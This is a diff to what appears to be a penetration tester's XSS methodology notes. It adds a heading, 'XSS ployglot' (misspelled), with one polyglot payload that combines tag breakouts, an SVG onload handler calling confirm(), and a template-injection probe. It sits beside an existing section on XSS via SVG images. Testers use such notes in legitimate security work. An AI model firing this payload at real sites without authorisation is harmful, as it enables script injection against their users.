@@ -1,3 +1,8 @@
+### XSS ployglot
+```
+\u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/onload=confirm(69)>${{7*7}}
+```
+
 #### XSS in SVG image 
 ![image](https://github.com/Sameer484/methodology/assets/110039044/e40a3018-7707-457b-a054-bf3bb3832674)
 
